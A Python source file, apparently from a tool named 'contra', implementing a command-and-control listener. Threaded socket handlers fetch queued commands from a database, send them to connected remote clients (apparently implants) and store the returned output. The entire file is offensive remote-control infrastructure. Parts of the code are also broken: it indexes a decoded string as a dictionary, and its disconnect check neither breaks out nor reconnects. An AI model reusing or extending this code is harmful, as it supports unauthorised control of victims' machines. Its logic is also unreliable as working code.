# Import the necessary modules
import queue
import threading
import socket
import random
import string
from contra.dbhelper import *

# Create an event object and set it to clear
portset = threading.Event()
portset.clear()

# Create dictionaries to hold Queues and Threads
Queues = {}
Threads = {}

# Create an empty dictionary to hold ports
ports = {}


# Function to generate a random program name
def generate_program_name():
    words = ["Alpha", "Beta", "Gamma", "Delta", "Epsilon", "Zeta", "Eta", "Theta", "Iota", "Kappa", "Lambda", "Mu", "Nu", "Xi", "Omicron", "Pi", "Rho", "Sigma", "Tau", "Upsilon", "Phi", "Chi", "Psi", "Omega"]
    word = random.choice(words)
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    program_name = f"{word}-{suffix}"
    return program_name

# Define a function to create a handler with a given name
def Handler(Name):
    # Print the name of the handler
    print(Name)
    
    # Create a queue for the handler
    Queues[Name]=queue.Queue()
    
    # Create a server socket and bind it to an address
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 0))
    
    # Listen for incoming connections
    server_socket.listen(5)

    # Get the port number of the server socket
    port=server_socket.getsockname()[1]
    print(port)
    ports[Name]=port
    
    # Set a flag indicating that the port has been set
    portset.set()
    
    # Wait for incoming connections and process them
    while True:
        conn, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address}")
        while True:    
            data=get_task_c2(Name)
            cmd=data['cmd']
            print("to connected user: " + str(cmd))
            conn.send(cmd.encode())

            data = conn.recv(1024).decode()
            print("from connected user: \n" + str(data))
            update_task_c2(data['taskid'],data)
            if not data:
                # If no data is received, break out of the loop and wait for reconnect
                print(f"Connection to {client_address} lost. Waiting for reconnect...")
            

# Define a function to create a handler and return its port number
def createHandler():
    # Generate a unique program name for the handler
    program_name = generate_program_name()
    
    # Create a new thread for the handler
    Threads[program_name]=threading.Thread(target=Handler,daemon=True,args=(program_name,))
    Threads[program_name].start()
    
    # Wait for the port to be set
    portset.wait()
    print(Threads,Queues)
    
    # Get the port number of the handler
    port_number=ports[program_name]
    print(port_number)
    
    # Clear the flag indicating that the port has been set
    portset.clear()

    # Return the port number of the handler
    return port_number,program_name

